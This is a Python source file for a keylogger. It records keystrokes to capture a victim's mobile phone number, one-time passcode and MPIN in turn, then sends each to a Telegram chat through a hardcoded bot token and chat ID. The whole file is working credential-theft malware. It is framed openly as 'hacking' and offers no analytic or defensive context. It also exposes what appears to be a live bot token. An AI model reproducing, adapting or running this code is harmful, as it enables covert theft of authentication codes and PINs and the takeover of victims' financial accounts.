import re
import requests
import pyperclip
import time
from pynput import keyboard
from colorama import init, Fore, Style

# --- INIT COLOR ---
init()

# --- CONFIG ---
BOT_TOKEN = "7907124038:AAGKBrtLeSYX14LD7aAhxkER4shLKy-UhFk"
CHAT_ID = "-1002881181747"

# --- REGEX ---
PHONE_REGEX = re.compile(r"^0?9\d{9}$")

# --- STATE ---
stage = "phone"
buffers = {"phone": "", "otp": "", "mpin": ""}
last_sent = {"phone": None, "otp": None, "mpin": None}

def send_to_telegram(value: str, label: str):
    emoji = {"phone": "📱", "otp": "🔐", "mpin": "🔐"}.get(label, "ℹ️")
    message = f"{emoji} <b>{label.upper()} Detected</b>\n──────────────\n<pre>{value}</pre>"
    try: pyperclip.copy(value)
    except: pass

    try:
        res = requests.post(
            f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage",
            data={"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"},
            timeout=5
        )
        if res.ok:
            print(Fore.GREEN + f"\n[📤 SENT ✓] {label.upper()}: {value}\n" + Style.RESET_ALL)
        else:
            print(Fore.RED + f"\n[✗ ERROR] {label.upper()}: {value} -> {res.status_code}\n" + Style.RESET_ALL)
    except Exception as e:
        print(Fore.RED + f"\n[✗ ERROR] {label.upper()}: {value} -> {e}\n" + Style.RESET_ALL)

def hacking_cycle_animation():
    print(Fore.GREEN + "\n🔁 Restarting capture cycle..." + Style.RESET_ALL)
    send_to_telegram("Restarting capture cycle...", "cycle")
    for i in range(10):
        bar = Fore.GREEN + "[" + "■" * (i + 1) + "□" * (9 - i) + "]" + Style.RESET_ALL
        print(bar, end="\r")
        time.sleep(0.1)
    print(Fore.GREEN + "[■■■■■■■■■■] Ready!\n" + Style.RESET_ALL)

def reset_cycle():
    global stage
    buffers["phone"] = ""
    buffers["otp"] = ""
    buffers["mpin"] = ""
    stage = "phone"
    hacking_cycle_animation()

def on_key_press(key):
    global stage, buffers, last_sent

    try:
        char = key.char
    except:
        char = ""

    if key == keyboard.Key.backspace:
        if buffers[stage]:
            buffers[stage] = buffers[stage][:-1]
        print(Style.DIM + f"[⌛] Typing {stage.upper()}: {buffers[stage]}      ", end="\r" + Style.RESET_ALL)
        return

    if not char.isdigit():
        return

    buffers[stage] += char

    # Trim buffer
    if stage == "phone":
        buffers["phone"] = buffers["phone"][-11:]
    elif stage == "otp":
        buffers["otp"] = buffers["otp"][-6:]
    elif stage == "mpin":
        buffers["mpin"] = buffers["mpin"][-4:]

    print(Style.DIM + f"[⌛] Typing {stage.upper()}: {buffers[stage]}", end="\r" + Style.RESET_ALL)

    # === DETECT PHASES ===
    if stage == "phone":
        phone = buffers["phone"]
        if PHONE_REGEX.fullmatch(phone):
            phone_clean = phone[-10:]
            if phone_clean != last_sent["phone"]:
                last_sent["phone"] = phone_clean
                send_to_telegram(phone_clean, "phone")
                stage = "otp"

    elif stage == "otp":
        otp = buffers["otp"]
        if len(otp) == 6 and otp != last_sent["otp"]:
            last_sent["otp"] = otp
            send_to_telegram(otp, "otp")
            stage = "mpin"

    elif stage == "mpin":
        mpin = buffers["mpin"]
        if len(mpin) == 4 and mpin != last_sent["mpin"]:
            last_sent["mpin"] = mpin
            send_to_telegram(mpin, "mpin")
            reset_cycle()

def start_listener():
    print(Fore.GREEN + "🟢 Listening... Type: Phone ➜ OTP ➜ MPIN" + Style.RESET_ALL)
    with keyboard.Listener(on_press=on_key_press) as listener:
        listener.join()

if __name__ == "__main__":
    start_listener()
